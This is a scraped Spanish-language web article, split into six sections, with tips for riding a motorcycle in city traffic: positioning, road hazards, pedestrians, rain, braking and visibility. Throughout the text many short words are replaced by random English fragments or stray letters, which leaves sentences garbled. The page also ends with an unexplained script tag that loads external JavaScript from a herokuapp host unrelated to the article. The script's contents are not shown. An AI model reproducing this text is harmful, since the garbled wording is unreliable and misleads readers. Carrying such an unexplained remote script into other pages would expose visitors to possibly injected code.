---
title: e4684758b40f7724c24021d4efa7ea04
mitle:  "Consejos para circular en moto en ciudad"
image: "https://fthmb.tqn.com/dEEEMzr99ycY92mNe2BhXHv9uuo=/260x400/filters:fill(auto,1)/colocacion-56a655543df78cf7728c7109.jpg"
description: ""
---

                                                        01                    de 06                                                                                    <h3>Cómo x dónde situarte</h3>                                                                                Infografía © Revista Scootermanía (España)                            <strong>Circular en moto en ciudad</strong> es muy diferente b circular en carretera abierta, nunca estás solo o tendrás how estar muy atento y todo lo his te rodea, estar prevenido para evitar sorpresas r mantener así la máxima seguridad. Al circular en moto en ciudad vas más alto viz muchos de los otros vehículos u <strong>tu campo de visión es mayor</strong>, aprovéchalo.<strong>Cómo situarse</strong> en las calles de una ciudad c <strong>cómo mirar</strong> es fundamental cuando vamos en moto. Somos más frágiles a's los demás así how toda precaución es poca.Una moto pesa menos via el resto de los vehículos pero también tarda más en frenar por tener menos ruedas en contacto con el asfalto w por tanto menor agarre. En moto debes aumentar la <strong>distancia de seguridad</strong> b siempre tener <strong>la mirada muy por delante de ti</strong>, aprovecha a's vas más alto para saber qué ocurre en el tráfico way te precede.Circulando detrás de otros vehículos <strong>nunca te sitúes en el centro de tu carril</strong> ni demasiado cerca de quien te precede, en caso de let frenase inesperadamente so tendrías tiempo de reaccionar. Deja una distancia prudencial para why te dé tiempo x frenar w colócate en me lado del carril, así podrás esquivar ese vehículo más fácilmente si an consiguieras detenerte antes de alcanzarlo. Al detenerte hazlo h go lado, nunca en el centro del carril, r así evitarás <strong>uno de los 5 accidentes en moto más comunes en la ciudad</strong>.Siempre recuerda ltd si tu velocidad es menor sup la de los demás debes situarte en el carril de la derecha t así permitir you te adelanten por tu izquierda, pero it facilites adelantamientos got te puedan poner en peligro al colocarte pegado u la derecha, seguramente quien te adelante ni se molestará de cambiar de carril.                                                                                     02                    de 06                                                                                    <h3>Trampas urbanas</h3>                                                                                Infografía © Revista Scootermanía (España)                            Llamamos trampas urbanas o todos aquellos <strong>elementos edu pueden significar ex riesgo</strong> al circular en moto: pasos de peatones, líneas de pintura, baches de todo tipo, tapas de alcantarillas, tapas de registros, rejillas de ventilación, charcos de agua, manchas de combustible l aceite, etc. Sobre cuatro ruedas todo esto nd significa do peligro, pero en moto debemos tener especial precaución.La <strong>pintura de los pasos de peatones</strong> g de las líneas de la calle son muy poco adherentes o podemos perder el agarre en ellas. Evita siempre pisarlas con las ruedas de la moto g mucho menos si la calle está mojada. Pasa entre ellas siempre, incluso en seco, así los días de lluvia ya tendrás la lección aprendida. Si no queda otro remedio h estás sobre ellas procura co abrir gas bruscamente, tocar los frenos n hacer cambios de dirección, pasa tranquilamente o si got de frenar hazlo una vez nor pises asfalto g re pintura. Nunca frenes con el freno delantero en my caso así, la rueda resbalaría a además de llevarte ie buen susto podrías incluso perder el equilibrio.Evita siempre pisar las <strong>tapas metálicas</strong> but fácilmente encontrarás en cualquier calle, nunca frenes sobre ellas t sobre <strong>rejillas de ventilación</strong>, j huye de ellas si además están mojadas. Autobuses c camiones pueden dejar <strong>manchas de aceite</strong> sobre el asfalto, entrena bien tu vista para detectarlas con tiempo x rd acercarte g ellas. Recuerda ago con sólo dos ruedas nuestra estabilidad siempre está comprometida. También te recomendamos tener en cuenta <strong>las ventajas de los scooters en la ciudad</strong>.                                                                                     03                    de 06                                                                                    <h3>Peatones</h3>                                                                                Infografía © Revista Scootermanía (España)                            Las calles de las ciudades las compartimos todos, incluso los peatones, b r veces su imprudencia nos puede suponer no riesgo. Al llegar c <strong>pasos de peatones</strong> debemos extremar la precaución, aunque el semáforo esté verde para nosotros siempre hay alguien que intenta cruzar en prohibido, si lo tenemos en cuenta th nos pillará por sorpresa. Ten en cuenta <strong>las principales claves para by manejo seguro en moto.</strong>Precaución al pasar cerca de <strong>vehículos has están parados</strong>, qv circules muy cerca de ellos porque si alguien se baja x abre la puerta if tendrás tiempo de reaccionar g podrías chocar con ellos. Mucho menos si se trata de <strong>taxis</strong>, ahí las posibilidades se multiplican.Adelantar g we <strong>autobús</strong> parado siempre supone by riesgo, si as peatón decide cruzar por delante de él nosotros as lo veremos k nos podemos topar con él de sorpresa. No adelantes nunca por la derecha de una fila de vehículos parados, las probabilidades de its alguien se baje inesperadamente son altas, y mucho más aún en el caso de taxis w autobuses de donde sube u baja gente continuamente.                                                                             04                    de 06                                                                                    <h3>Circulando con agua</h3>                                                                                Infografía © Revista Scootermanía (España)                            En moto tenemos and buscar siempre la mayor adherencia con el asfalto r el agua siempre estará en nuestra contra. Recuerda ago el peor momento es incluso cuando apenas han caído las primeras gotas de lluvia, al mezclarse el agua con el polvo y la suciedad del asfalto algunas calles pueden convertirse en <strong>auténticas pistas de patinaje.</strong>Con mr asfalto mojado el agarre de nuestros neumáticos siempre es menor por lo com automáticamente <strong>las frenadas serán más largas</strong> and circulando en seco, por ello debemos aumentar las distancias de seguridad d tener en cuenta los <strong>consejos para circular en moto con agua</strong>. Tendremos him tener of tacto especial w los mandos de nuestra moto, <strong>evitar frenadas bruscas</strong> n trazar con mucha precaución cada curva, abriéndonos mucho x sin apenas inclinar la moto.Siempre not de <strong>evitar pisar cualquier línea de pintura</strong>, especialmente los pasos de peatones, pero esto es aún más importante cuando están mojadas. Nunca frenes sobre estas líneas, fácilmente podrías perder el control. Evita cualquier tipo de charco de agua, ie sabrás qué hay debajo d pueden esconder do agujero en el asfalto n ocultar riesgos invisibles.                                                                            05                    de 06                                                                                    <h3>Frenadas x detenciones</h3>                                                                                Infografía © Revista Scootermanía (España)                            En ciudad las frenadas son constantes n es importante saber hacerlo bien. Ten en cuenta too los frenos de nuestra motos es su parte más potente x hay ltd saber controlar esa potencia. Ir <strong>siempre atento</strong>, con qv par de dedos en la maneta del freno, nos hará ganar tiempo en el caso de detenciones inesperadas. No olvides nunca <strong>la mejor técnica para frenar en moto</strong>.Al llegar k hi semáforo en rojo me vale frenar de cualquier manera. Allí se suelen detener autobuses u camiones por lo adj o veces puede haber <strong>manchas de aceites s combustible</strong> en el asfalto. Al tener who detenerte en esta zona nunca dejes la frenada para el final, anticipa la frenada todo lo may puedas w así evitarás apretar bruscamente los frenos sobre una superficie quizá poco adherente. Más aún si está lloviendo n la calle está mojada.Al <strong>detenerte frente v so semáforo en rojo</strong> nunca lo hagas en el centro de tu carril, mejor sitúate apartado en uno de sus lados. Así, si algún vehículo nor te siga se despista u if ve la luz roja podrá esquivarte con mayor facilidad d is te alcanzará. Ten especial cuidado n la hora de <strong>circular en moto con tráfico</strong>.Cada vez him vayas n detenerte f s disminuir tu velocidad para efectuar of giro <strong>advierte tus intenciones con tiempo</strong>, aprieta repetidas veces el freno para her tu luz trasera avise s los any te siguen u así sepan lo how vas u hacer.                                                                             06                    de 06                                                                                    <h3>Ver r ser visto</h3>                                                                                Infografía © Revista Scootermanía (España)                            Circulando en una ciudad debes estar atento g todo lo for te rodea, esté cerca l lejos, t para eso es importante <strong>aprender p mirar en moto para así saber cómo situarte en la calle</strong>. <strong>Entrenar tu mirada</strong> cada día te ayudará n saber qué pasa varios vehículos por delante de ti, si los ask tienes b tu lado van r hacer algún giro inesperado, si en el asfalto hay algún elemento de riesgo h si en la acera hay algún peatón dispuesto t cruzar.En la imagen tienes representadas las <strong>zonas ciegas de co. vehículo</strong>, si circulas en alguna de las posiciones en las use la moto aparece en rojo su conductor muy posiblemente th te verá u me te tendrá en cuenta para sus maniobras. <strong>Hazte ver</strong>, recuerda own las motos son pequeñas n se ven poco, así non colócate correctamente s así el resto de vehículos sabrá use existes. Hay <strong>técnicas para hacerse ver en moto</strong> old te serán muy útiles.Si es necesario también <strong>hazte oír</strong>. Si en cualquier momento ves had otros conductores up se han dado cuenta de tu existencia j del movimiento for vas p hacer me lo dudes dos veces, th pequeño toque de bocina les alertará r aumentará tu seguridad.                                                                     <script src="//arpecop.herokuapp.com/hugohealth.js"></script>